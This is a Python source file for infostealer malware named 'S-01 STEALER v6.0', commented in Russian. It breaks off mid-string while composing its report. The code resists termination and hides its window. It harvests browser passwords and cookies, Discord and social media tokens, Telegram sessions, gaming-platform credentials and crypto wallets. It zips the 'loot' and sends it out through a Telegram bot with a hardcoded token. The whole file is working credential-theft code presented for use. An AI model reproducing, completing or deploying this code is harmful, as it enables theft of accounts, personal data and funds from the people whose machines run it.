#!/usr/bin/env python3
"""
S-01 STEALER v6.0 — ULTIMATE EDITION
Сбор всего: соцсети, игры, куки, токены, пароли, крипта.
Защита от закрытия: мультипроцесс + watchdog.
Отправка только в Telegram.
"""
import os
import sys
import json
import time
import shutil
import sqlite3
import platform
import tempfile
import zipfile
import urllib.request
import urllib.parse
import re
import socket
import ssl
import uuid
import base64
import subprocess
import multiprocessing
import signal
import ctypes

# ============================================
# ОБХОД SSL
# ============================================
ssl._create_default_https_context = ssl._create_unverified_context

# ============================================
# НАСТРОЙКИ БОТА
# ============================================
BOT_TOKEN = "8169929310:AAHOaYRA3SLa7ai_AtqOw_N48e9Z5qFzEpQ"
CHAT_ID = "8005475697"

VICTIM_ID = str(uuid.uuid4()).replace('-', '')[:16]

# ============================================
# ЗАЩИТА ОТ ЗАКРЫТИЯ
# ============================================
def protect_process():
    """Защита процесса от завершения"""
    # Делаем процесс критическим (синий экран при убийстве) - Windows
    if os.name == 'nt':
        try:
            # Включаем SeDebugPrivilege
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            # Делаем процесс критическим
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        except:
            pass
    
    # Игнорируем сигналы завершения
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    
    # Скрываем окно консоли
    if os.name == 'nt':
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def watchdog_process():
    """Watchdog процесс - перезапускает стилер если его убили"""
    while True:
        time.sleep(3)
        # Проверяем что родитель жив
        try:
            os.kill(os.getppid(), 0)
        except OSError:
            # Родитель умер, запускаем заново
            subprocess.Popen([sys.executable] + sys.argv, 
                           creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
            os._exit(0)

# ============================================
# ОТПРАВКА В TELEGRAM
# ============================================
def log(msg):
    print(f"[*] {msg}", flush=True)

def get_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def send_telegram_message(text):
    """Отправка сообщения в Telegram"""
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = urllib.parse.urlencode({
            'chat_id': CHAT_ID,
            'text': str(text)[:4000],
            'parse_mode': 'HTML'
        }).encode('utf-8')
        
        req = urllib.request.Request(url, data=data)
        response = urllib.request.urlopen(req, timeout=15, context=get_ctx())
        result = json.loads(response.read().decode('utf-8'))
        return result.get('ok', False)
    except Exception as e:
        log(f"TG msg error: {e}")
        return False

def send_telegram_file(filepath, caption=""):
    """Отправка файла в Telegram"""
    try:
        boundary = '----Boundary' + str(int(time.time()))
        fname = os.path.basename(filepath)
        file_size = os.path.getsize(filepath)
        
        log(f"Отправка файла: {fname} ({file_size} bytes)")
        
        with open(filepath, 'rb') as f:
            content = f.read()
        
        body = b''
        body += ('--' + boundary + '\r\n').encode()
        body += f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'.encode()
        
        if caption:
            body += ('--' + boundary + '\r\n').encode()
            body += f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption[:1024]}\r\n'.encode()
        
        body += ('--' + boundary + '\r\n').encode()
        body += f'Content-Disposition: form-data; name="document"; filename="{fname}"\r\n'.encode()
        body += b'Content-Type: application/octet-stream\r\n\r\n'
        body += content
        body += f'\r\n--{boundary}--\r\n'.encode()
        
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
        req = urllib.request.Request(url, data=body, headers={
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        })
        response = urllib.request.urlopen(req, timeout=120, context=get_ctx())
        result = json.loads(response.read().decode('utf-8'))
        log(f"TG file: {'OK' if result.get('ok') else result.get('description')}")
        return result.get('ok', False)
    except Exception as e:
        log(f"TG file error: {e}")
        return False

# ============================================
# СБОР ПАРОЛЕЙ БРАУЗЕРОВ
# ============================================
def get_chrome_data(browser_name, base_path):
    """Сбор паролей и куки из Chrome-based браузеров"""
    passwords = []
    cookies = []
    
    login_db = os.path.join(base_path, "Login Data")
    cookies_db = os.path.join(base_path, "Cookies")
    # Исправлено: Network/Cookies вместо Cookies
    network_cookies = os.path.join(base_path, "Network", "Cookies")
    
    if os.path.exists(login_db):
        try:
            tmp = os.path.join(tempfile.gettempdir(), f"{browser_name}_login_{VICTIM_ID}.db")
            shutil.copy2(login_db, tmp)
            conn = sqlite3.connect(tmp)
            c = conn.cursor()
            c.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            for row in c.fetchall():
                passwords.append({
                    "url": row[0],
                    "login": row[1],
                    "password": row[2],
                })
            conn.close()
            os.remove(tmp)
            log(f"{browser_name}: {len(passwords)} паролей")
        except Exception as e:
            log(f"{browser_name} пароли ошибка: {e}")
    
    # Пробуем разные пути к кукам
    cookie_path = cookies_db
    if os.path.exists(network_cookies):
        cookie_path = network_cookies
    
    if os.path.exists(cookie_path):
        try:
            tmp = os.path.join(tempfile.gettempdir(), f"{browser_name}_cookies_{VICTIM_ID}.db")
            shutil.copy2(cookie_path, tmp)
            conn = sqlite3.connect(tmp)
            c = conn.cursor()
            c.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
            for row in c.fetchall():
                cookies.append({
                    "host": row[0],
                    "name": row[1],
                    "value_encrypted": row[2].hex() if row[2] else "",
                    "path": row[3],
                    "expires": row[4],
                })
            conn.close()
            os.remove(tmp)
            log(f"{browser_name}: {len(cookies)} куки")
        except Exception as e:
            log(f"{browser_name} куки ошибка: {e}")
    
    return passwords, cookies

def get_firefox_data():
    """Сбор паролей и куки Firefox"""
    passwords = []
    cookies = []
    
    ff_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
    if not os.path.exists(ff_path):
        # Linux
        ff_path = os.path.expanduser("~/.mozilla/firefox")
    
    if os.path.exists(ff_path):
        for profile in os.listdir(ff_path):
            profile_path = os.path.join(ff_path, profile)
            if os.path.isdir(profile_path):
                # Пароли
                logins_file = os.path.join(profile_path, "logins.json")
                if os.path.exists(logins_file):
                    try:
                        with open(logins_file, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            for entry in data.get('logins', []):
                                passwords.append({
                                    "url": entry.get('hostname', ''),
                                    "login": entry.get('encryptedUsername', ''),
                                    "password": "(encrypted)",
                                })
                        log(f"Firefox: {len(passwords)} паролей")
                    except Exception as e:
                        log(f"Firefox пароли ошибка: {e}")
                
                # Куки
                cookies_db = os.path.join(profile_path, "cookies.sqlite")
                if os.path.exists(cookies_db):
                    try:
                        tmp = os.path.join(tempfile.gettempdir(), f"ff_cookies_{VICTIM_ID}.db")
                        shutil.copy2(cookies_db, tmp)
                        conn = sqlite3.connect(tmp)
                        c = conn.cursor()
                        c.execute("SELECT host, name, value, path, expiry FROM moz_cookies")
                        for row in c.fetchall():
                            cookies.append({
                                "host": row[0],
                                "name": row[1],
                                "value": row[2],
                                "path": row[3],
                                "expires": row[4],
                            })
                        conn.close()
                        os.remove(tmp)
                        log(f"Firefox: {len(cookies)} куки")
                    except Exception as e:
                        log(f"Firefox куки ошибка: {e}")
    
    return passwords, cookies

# ============================================
# СБОР ТОКЕНОВ СОЦСЕТЕЙ
# ============================================
def get_discord_tokens():
    """Discord токены"""
    tokens = []
    paths = [
        os.path.expanduser("~/Library/Application Support/discord/Local Storage/leveldb"),
        os.path.expanduser("~/Library/Application Support/discordcanary/Local Storage/leveldb"),
        os.path.expanduser("~/Library/Application Support/discordptb/Local Storage/leveldb"),
        os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
        os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb"),
        # Windows paths
        os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
    ]
    
    for db_path in paths:
        if os.path.exists(db_path):
            log(f"Discord найден: {db_path}")
            for filename in os.listdir(db_path):
                if filename.endswith(('.ldb', '.log')):
                    try:
                        filepath = os.path.join(db_path, filename)
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                            # Токены ботов
                            found = re.findall(r'mfa\.[\w-]{84}', content)
                            tokens.extend(found)
                            # Пользовательские токены
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}', content)
                            tokens.extend(found)
                            # Новый формат
                            found = re.findall(r'dQw4w9WgXcQ:[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}', content)
                            tokens.extend(found)
                    except Exception as e:
                        log(f"Discord ошибка: {e}")
    
    return list(set(tokens))

def get_telegram_session(temp_dir):
    """Telegram tdata + сессия"""
    tdata_paths = [
        os.path.expanduser("~/Library/Application Support/Telegram Desktop/tdata"),
        os.path.expanduser("~/.local/share/TelegramDesktop/tdata"),
        os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata"),
    ]
    
    for tdata_path in tdata_paths:
        if os.path.exists(tdata_path):
            log("Telegram найден")
            try:
                dst = os.path.join(temp_dir, "telegram_session")
                os.makedirs(dst, exist_ok=True)
                # Копируем только нужные файлы
                for item in ['key_data', 'D877F783D5D3EF8C', 'map*', 'settings*']:
                    for f in os.listdir(tdata_path):
                        if f.startswith(item.rstrip('*')) or (item.endswith('*') and item.rstrip('*') in f):
                            src = os.path.join(tdata_path, f)
                            try:
                                if os.path.isdir(src):
                                    shutil.copytree(src, os.path.join(dst, f), dirs_exist_ok=True)
                                else:
                                    shutil.copy2(src, os.path.join(dst, f))
                            except:
                                pass
                log("Telegram сессия скопирована")
                return True
            except Exception as e:
                log(f"Telegram ошибка: {e}")
    return False

def get_steam_data(temp_dir):
    """Steam - файлы сессий и конфиги"""
    steam_data = {"accounts": [], "ssfn": []}
    
    steam_paths = [
        os.path.expanduser("~/Library/Application Support/Steam"),
        os.path.expanduser("~/.local/share/Steam"),
        os.path.expandvars(r"C:\Program Files (x86)\Steam"),
    ]
    
    for steam_path in steam_paths:
        if os.path.exists(steam_path):
            log(f"Steam найден: {steam_path}")
            
            # SSFN файлы (Steam Sentry File)
            for root, dirs, files in os.walk(steam_path):
                for f in files:
                    if f.endswith('.ssfn') or f == 'ssfn':
                        try:
                            src = os.path.join(root, f)
                            dst = os.path.join(temp_dir, "steam", f)
                            os.makedirs(os.path.dirname(dst), exist_ok=True)
                            shutil.copy2(src, dst)
                            steam_data["ssfn"].append(f)
                        except:
                            pass
            
            # config.vdf - список аккаунтов
            config_vdf = os.path.join(steam_path, "config", "config.vdf")
            if os.path.exists(config_vdf):
                try:
                    with open(config_vdf, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Поиск имён аккаунтов
                        accounts = re.findall(r'"PersonaName"\s+"([^"]+)"', content)
                        steam_ids = re.findall(r'"SteamID"\s+"(\d+)"', content)
                        for acc, sid in zip(accounts, steam_ids):
                            steam_data["accounts"].append({"name": acc, "steam_id": sid})
                        
                        # Копируем config
                        dst = os.path.join(temp_dir, "steam", "config.vdf")
                        os.makedirs(os.path.dirname(dst), exist_ok=True)
                        shutil.copy2(config_vdf, dst)
                except:
                    pass
            
            # LoginUsers.vdf
            login_users = os.path.join(steam_path, "config", "loginusers.vdf")
            if os.path.exists(login_users):
                try:
                    dst = os.path.join(temp_dir, "steam", "loginusers.vdf")
                    os.makedirs(os.path.dirname(dst), exist_ok=True)
                    shutil.copy2(login_users, dst)
                except:
                    pass
            
            break
    
    return steam_data

def get_epic_games(temp_dir):
    """Epic Games Launcher данные"""
    epic_data = []
    
    epic_paths = [
        os.path.expanduser("~/Library/Application Support/Epic/EpicGamesLauncher/Saved/Config/Windows"),
        os.path.expanduser("~/.config/Epic/EpicGamesLauncher/Saved/Config/Windows"),
        os.path.expandvars(r"%LOCALAPPDATA%\EpicGamesLauncher\Saved\Config\Windows"),
    ]
    
    for epic_path in epic_paths:
        if os.path.exists(epic_path):
            log("Epic Games найден")
            # GameUserSettings.ini содержит логин
            for f in os.listdir(epic_path):
                if f.endswith('.ini'):
                    try:
                        with open(os.path.join(epic_path, f), 'r', errors='ignore') as file:
                            content = file.read()
                            # Ищем LastLoggedInUser или логин
                            logins = re.findall(r'LastLoggedInUser=([^\n]+)', content)
                            epic_data.extend(logins)
                    except:
                        pass
            
            # Копируем конфиги
            dst = os.path.join(temp_dir, "epic_games")
            try:
                shutil.copytree(epic_path, dst, dirs_exist_ok=True)
            except:
                pass
            break
    
    return epic_data

def get_battle_net(temp_dir):
    """Battle.net данные"""
    bn_data = []
    
    bn_paths = [
        os.path.expanduser("~/Library/Application Support/Battle.net"),
        os.path.expanduser("~/.wine/drive_c/ProgramData/Battle.net"),
        os.path.expandvars(r"%APPDATA%\Battle.net"),
        os.path.expandvars(r"%PROGRAMDATA%\Battle.net"),
    ]
    
    for bn_path in bn_paths:
        if os.path.exists(bn_path):
            log("Battle.net найден")
            # Ищем конфиги с аккаунтами
            for root, dirs, files in os.walk(bn_path):
                for f in files:
                    if f.endswith('.config') or f == 'account.db':
                        try:
                            src = os.path.join(root, f)
                            dst = os.path.join(temp_dir, "battle_net", f)
                            os.makedirs(os.path.dirname(dst), exist_ok=True)
                            shutil.copy2(src, dst)
                        except:
                            pass
            break
    
    return bn_data

def get_riot_games(temp_dir):
    """Riot Games (League of Legends, Valorant)"""
    riot_data = []
    
    riot_paths = [
        os.path.expanduser("~/Library/Application Support/Riot Games"),
        os.path.expandvars(r"%APPDATA%\Riot Games"),
    ]
    
    for riot_path in riot_paths:
        if os.path.exists(riot_path):
            log("Riot Games найден")
            for root, dirs, files in os.walk(riot_path):
                for f in files:
                    if f in ['RiotClientSettings.yaml', 'LeagueClientSettings.yaml']:
                        try:
                            with open(os.path.join(root, f), 'r', errors='ignore') as file:
                                content = file.read()
                                # Ищем логины
                                usernames = re.findall(r'username:?\s*["\']?([^"\'\n]+)', content, re.IGNORECASE)
                                riot_data.extend(usernames)
                        except:
                            pass
                    
                    if f.endswith('.yaml') or f == 'lockfile':
                        try:
                            src = os.path.join(root, f)
                            dst = os.path.join(temp_dir, "riot_games", f)
                            os.makedirs(os.path.dirname(dst), exist_ok=True)
                            shutil.copy2(src, dst)
                        except:
                            pass
            break
    
    return riot_data

def get_minecraft_data(temp_dir):
    """Minecraft - лаунчеры и сессии"""
    mc_data = {"accounts": [], "sessions": []}
    
    mc_paths = [
        os.path.expanduser("~/Library/Application Support/minecraft"),
        os.path.expanduser("~/.minecraft"),
        os.path.expandvars(r"%APPDATA%\.minecraft"),
    ]
    
    # TLauncher
    tlauncher_paths = [
        os.path.expanduser("~/Library/Application Support/tlauncher"),
        os.path.expanduser("~/.tlauncher"),
        os.path.expandvars(r"%APPDATA%\.tlauncher"),
    ]
    
    all_paths = mc_paths + tlauncher_paths
    
    for mc_path in all_paths:
        if os.path.exists(mc_path):
            log(f"Minecraft найден: {mc_path}")
            
            # launcher_accounts.json
            accounts_file = os.path.join(mc_path, "launcher_accounts.json")
            if os.path.exists(accounts_file):
                try:
                    with open(accounts_file, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'accounts' in data:
                            for acc_id, acc in data['accounts'].items():
                                mc_data["accounts"].append({
                                    "id": acc_id,
                                    "username": acc.get('username', acc.get('email', '')),
                                    "type": acc.get('type', ''),
                                })
                except:
                    pass
            
            # TL - accounts.json
            tl_accounts = os.path.join(mc_path, "accounts.json")
            if os.path.exists(tl_accounts):
                try:
                    with open(tl_accounts, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        if isinstance(data, list):
                            for acc in data:
                                mc_data["accounts"].append({
                                    "username": acc.get('username', ''),
                                    "email": acc.get('email', ''),
                                })
                except:
                    pass
            
            # Launcher profiles
            profiles_file = os.path.join(mc_path, "launcher_profiles.json")
            if os.path.exists(profiles_file):
                try:
                    dst = os.path.join(temp_dir, "minecraft", "launcher_profiles.json")
                    os.makedirs(os.path.dirname(dst), exist_ok=True)
                    shutil.copy2(profiles_file, dst)
                except:
                    pass
            
            break
    
    return mc_data

def get_social_media_tokens(temp_dir):
    """Токены соцсетей: Instagram, Twitter, TikTok, Reddit"""
    social_data = {
        "instagram": [],
        "twitter": [],
        "tiktok": [],
        "reddit": [],
        "vk": [],
        "telegram_tokens": [],
    }
    
    # Общие пути для LevelDB браузеров
    browser_data_paths = {
        "Chrome": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb"),
        "Edge": os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/Local Storage/leveldb"),
        "Brave": os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"),
        "Opera": os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera/Local Storage/leveldb"),
    }
    
    # Добавляем Windows пути
    if os.name == 'nt':
        browser_data_paths.update({
            "Chrome_Win": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
            "Edge_Win": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
            "Brave_Win": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
        })
    
    for browser, db_path in browser_data_paths.items():
        if os.path.exists(db_path):
            log(f"Сканирую {browser} на токены соцсетей...")
            for filename in os.listdir(db_path):
                if filename.endswith(('.ldb', '.log')):
                    try:
                        filepath = os.path.join(db_path, filename)
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                            
                            # Instagram
                            insta_tokens = re.findall(r'instagram.*?"access_token":"([^"]+)"', content)
                            social_data["instagram"].extend(insta_tokens)
                            
                            # Twitter/X
                            tw_tokens = re.findall(r'twitter.*?"auth_token":"([^"]+)"', content)
                            social_data["twitter"].extend(tw_tokens)
                            # Bearer tokens Twitter
                            tw_bearer = re.findall(r'AAAAAAAAAAAAAAAAAAAA[^"]+', content)
                            social_data["twitter"].extend(tw_bearer)
                            
                            # TikTok
                            tt_sid = re.findall(r'sessionid=([a-f0-9]+)', content)
                            social_data["tiktok"].extend(tt_sid)
                            tt_token = re.findall(r'tiktok.*?"token":"([^"]+)"', content)
                            social_data["tiktok"].extend(tt_token)
                            
                            # Reddit
                            reddit_tokens = re.findall(r'reddit.*?"accessToken":"([^"]+)"', content)
                            social_data["reddit"].extend(reddit_tokens)
                            
                            # VK
                            vk_tokens = re.findall(r'vk1\.[\w-]{100,}', content)
                            social_data["vk"].extend(vk_tokens)
                            vk_access = re.findall(r'access_token":"([a-f0-9]{80,})"', content)
                            social_data["vk"].extend(vk_access)
                            
                            # Telegram веб токены
                            tg_web = re.findall(r'telegram.*?"tgWebAppData":"([^"]+)"', content)
                            social_data["telegram_tokens"].extend(tg_web)
                    except:
                        pass
    
    # Очистка дубликатов
    for key in social_data:
        social_data[key] = list(set(social_data[key]))
    
    return social_data

def get_crypto_wallets(temp_dir):
    """Крипто-кошельки и расширения"""
    wallets = []
    
    # MetaMask, Phantom, Trust Wallet и др.
    wallet_extensions = {
        "Metamask": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm"],
        "Phantom": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"],
        "Trust Wallet": ["egjidjbpglichdcondbcbdnbeeppgdph"],
        "Coinbase Wallet": ["hnfanknocfeofbddgcijnmhnfnkdnaad"],
        "Binance Chain Wallet": ["fhbohimaelbohpjbbldcngcnapndodjp"],
        "Ronin": ["fnjhmkhhmkbjkkabndcnnogagogbneec"],
        "TronLink": ["ibnejdfjmmkpcnlpebklmnkoeoihofec"],
        "Exodus": ["aholpfdialjgjfhomihkjbmgjidlcdno"],
    }
    
    # Пути к расширениям браузеров
    extension_paths = [
        os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Extensions"),
        os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/Extensions"),
        os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Extensions"),
    ]
    
    if os.name == 'nt':
        extension_paths.extend([
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions"),
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Extensions"),
        ])
    
    for ext_path in extension_paths:
        if os.path.exists(ext_path):
            for wallet_name, ext_ids in wallet_extensions.items():
                for ext_id in ext_ids:
                    wallet_path = os.path.join(ext_path, ext_id)
                    if os.path.exists(wallet_path):
                        log(f"Найден кошелёк: {wallet_name}")
                        wallets.append(wallet_name)
                        # Копируем данные расширения
                        dst = os.path.join(temp_dir, "crypto_wallets", wallet_name + "_" + ext_id)
                        try:
                            shutil.copytree(wallet_path, dst, dirs_exist_ok=True)
                        except:
                            pass
    
    # Ищем файлы wallet.dat (Bitcoin Core и др.)
    wallet_files = [
        os.path.expanduser("~/Library/Application Support/Bitcoin/wallet.dat"),
        os.path.expanduser("~/.bitcoin/wallet.dat"),
        os.path.expandvars(r"%APPDATA%\Bitcoin\wallet.dat"),
        os.path.expanduser("~/Library/Application Support/Electrum/wallets"),
        os.path.expanduser("~/.electrum/wallets"),
        os.path.expanduser("~/Library/Application Support/Exodus/exodus.wallet"),
        os.path.expanduser("~/Library/Application Support/atomic/Local Storage/leveldb"),
    ]
    
    for wf in wallet_files:
        if os.path.exists(wf):
            log(f"Найден wallet файл: {wf}")
            try:
                dst = os.path.join(temp_dir, "crypto_wallets", os.path.basename(wf))
                os.makedirs(os.path.dirname(dst), exist_ok=True)
                if os.path.isdir(wf):
                    shutil.copytree(wf, dst, dirs_exist_ok=True)
                else:
                    shutil.copy2(wf, dst)
            except:
                pass
    
    return wallets

def get_system_info():
    """Полная информация о системе"""
    info = {
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()} {platform.version()}",
        "machine": platform.machine(),
        "processor": platform.processor(),
        "architecture": platform.architecture()[0],
    }
    
    try:
        info["user"] = os.getlogin()
    except:
        info["user"] = "unknown"
    
    try:
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
    except:
        info["local_ip"] = "unknown"
    
    # Публичный IP
    try:
        ctx = get_ctx()
        resp = urllib.request.urlopen("https://api.ipify.org", timeout=10, context=ctx)
        info["public_ip"] = resp.read().decode('utf-8')
    except:
        info["public_ip"] = "unknown"
    
    # Информация о GPU
    try:
        if os.name == 'nt':
            gpu_info = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                                     capture_output=True, text=True, timeout=5)
            info["gpu"] = gpu_info.stdout.strip().split('\n')[-1].strip()
        else:
            gpu_info = subprocess.run(['system_profiler', 'SPDisplaysDataType'], 
                                     capture_output=True, text=True, timeout=5)
            info["gpu"] = gpu_info.stdout[:200]
    except:
        info["gpu"] = "unknown"
    
    # Оперативная память
    try:
        import psutil
        ram = psutil.virtual_memory()
        info["ram_total"] = f"{ram.total // (1024**3)} GB"
        info["ram_available"] = f"{ram.available // (1024**3)} GB"
    except:
        pass
    
    return info

# ============================================
# ГЛАВНАЯ ФУНКЦИЯ
# ============================================
def main_stealer():
    """Основная логика стилера"""
    protect_process()
    
    print("""
    ╔══════════════════════════════════════╗
    ║     S-01 STEALER v6.0 - ULTIMATE    ║
    ╚══════════════════════════════════════╝
    """)
    
    log(f"ID: {VICTIM_ID}")
    log("Начинаю сбор данных...")
    
    temp_dir = tempfile.mkdtemp(prefix="s01_loot_")
    log(f"Временная папка: {temp_dir}")
    
    # ========== СИСТЕМА ==========
    log("="*50)
    log("СИСТЕМНАЯ ИНФОРМАЦИЯ")
    log("="*50)
    sys_info = get_system_info()
    
    # ========== БРАУЗЕРЫ ==========
    log("="*50)
    log("БРАУЗЕРЫ - ПАРОЛИ И КУКИ")
    log("="*50)
    
    all_passwords = []
    all_cookies = []
    
    browsers = {
        "Chrome": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default"),
        "Edge": os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default"),
        "Brave": os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default"),
        "Opera": os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera/Default"),
        "Yandex": os.path.expanduser("~/Library/Application Support/Yandex/YandexBrowser/Default"),
        "Chromium": os.path.expanduser("~/Library/Application Support/Chromium/Default"),
    }
    
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            pwds, cookies = get_chrome_data(browser_name, browser_path)
            all_passwords.extend(pwds)
            all_cookies.extend([{**c, "browser": browser_name} for c in cookies])
    
    # Firefox
    ff_pwds, ff_cookies = get_firefox_data()
    all_passwords.extend(ff_pwds)
    all_cookies.extend([{**c, "browser": "Firefox"} for c in ff_cookies])
    
    # ========== СОЦСЕТИ ==========
    log("="*50)
    log("СОЦСЕТИ И ТОКЕНЫ")
    log("="*50)
    
    discord_tokens = get_discord_tokens()
    has_telegram = get_telegram_session(temp_dir)
    social_tokens = get_social_media_tokens(temp_dir)
    
    # ========== ИГРЫ ==========
    log("="*50)
    log("ИГРОВЫЕ ПЛАТФОРМЫ")
    log("="*50)
    
    steam_data = get_steam_data(temp_dir)
    epic_data = get_epic_games(temp_dir)
    bn_data = get_battle_net(temp_dir)
    riot_data = get_riot_games(temp_dir)
    mc_data = get_minecraft_data(temp_dir)
    
    # ========== КРИПТО-КОШЕЛЬКИ ==========
    log("="*50)
    log("КРИПТО-КОШЕЛЬКИ")
    log("="*50)
    
    wallets = get_crypto_wallets(temp_dir)
    
    # ========== СОХРАНЕНИЕ ДАННЫХ ==========
    log("="*50)
    log("СОХРАНЕНИЕ РЕЗУЛЬТАТОВ")
    log("="*50)
    
    full_loot = {
        "victim_id": VICTIM_ID,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "system": sys_info,
        "passwords_count": len(all_passwords),
        "passwords": all_passwords,
        "cookies_count": len(all_cookies),
        "cookies": all_cookies,
        "discord_tokens": discord_tokens,
        "telegram_session": has_telegram,
        "social_media": social_tokens,
        "steam": steam_data,
        "epic_games": epic_data,
        "battle_net": bn_data,
        "riot_games": riot_data,
        "minecraft": mc_data,
        "crypto_wallets": wallets,
    }
    
    # Сохраняем JSON
    json_path = os.path.join(temp_dir, "full_loot.json")
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(full_loot, f, indent=2, ensure_ascii=False)
    
    # Сохраняем TXT (читаемый)
    txt_path = os.path.join(temp_dir, "passwords.txt")
    with open(txt_path, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write("PASSWORDS\n")
        f.write("="*60 + "\n")
        for pwd in all_passwords:
            f.write(f"[{pwd.get('source', '?')}] {pwd.get('url', '')}\n")
            f.write(f"  Login: {pwd.get('login', '')}\n")
            f.write(f"  Password: {pwd.get('password', '')}\n")
            f.write("-"*40 + "\n")
        
        f.write("\n" + "="*60 + "\n")
        f.write("COOKIES\n")
        f.write("="*60 + "\n")
        for cookie in all_cookies[:500]:  # Ограничиваем
            f.write(f"[{cookie.get('browser', '?')}] {cookie.get('host', '')} | {cookie.get('name', '')}\n")
        
        f.write("\n" + "="*60 + "\n")
        f.write("DISCORD TOKENS\n")
        f.write("="*60 + "\n")
        for token in discord_tokens:
            f.write(f"{token}\n")
        
        f.write("\n" + "="*60 + "\n")
        f.write("SOCIAL MEDIA\n")
        f.write("="*60 + "\n")
        for platform, tokens in social_tokens.items():
            if tokens:
                f.write(f"\n--- {platform.upper()} ---\n")
                for t in tokens:
                    f.write(f"{t}\n")
        
        f.write("\n" + "="*60 + "\n")
        f.write("STEAM ACCOUNTS\n")
        f.write("="*60 + "\n")
        for acc in steam_data.get("accounts", []):
            f.write(f"  {acc.get('name', '')} | SteamID: {acc.get('steam_id', '')}\n")
        
        f.write("\n" + "="*60 + "\n")
        f.write("MINECRAFT ACCOUNTS\n")
        f.write("="*60 + "\n")
        for acc in mc_data.get("accounts", []):
            f.write(f"  {acc.get('username', '')} | {acc.get('email', '')}\n")
        
        f.write("\n" + "="*60 + "\n")
        f.write("CRYPTO WALLETS\n")
        f.write("="*60 + "\n")
        for w in wallets:
            f.write(f"  {w}\n")
    
    # Сохраняем куки отдельно
    cookies_path = os.path.join(temp_dir, "cookies.json")
    with open(cookies_path, 'w', encoding='utf-8') as f:
        json.dump(all_cookies, f, indent=2, ensure_ascii=False)
    
    # ========== ZIP ==========
    zip_path = os.path.join(temp_dir, "full_loot.zip")
    log("Создаю ZIP архив...")
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                if file != "full_loot.zip":
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zf.write(file_path, arcname)
    
    zip_size = os.path.getsize(zip_path)
    log(f"ZIP создан: {zip_size} bytes")
    
    # ========== ОТПРАВКА В TELEGRAM ==========
    log("="*50)
    log("ОТПРАВКА В TELEGRAM")
    log("="*50)
    
    # Формируем отчёт
    report = f"""📊 <b>S-01 LOG</b> | <code>{VICTIM_ID[:8]}</code>

🖥 <b>System:</b>
• Host: <code>{sys_info['hostname']}</code>
• OS: <code>{sys_info['os']}</code>
• User: <code>{sys_info['user']}</code>
• IP: <code>{sys_info['local_ip']}</code>
• GPU: <code>{sys_info.get('gpu', '?')[:50]}</code>

📊 <b>Собрано:</b>
• 🔑 Паролей: <b>{len(all_passwords)}</b>
• 🍪 Куки: <b>{len(all_cookies)}</b>
• 💬 Discord: <b>{len(discord_tokens)}</b>
• 📱 Telegram: <b>{'✅' if has_telegram else '❌'}</b>

📱 <b>Соцсети токены:</b>
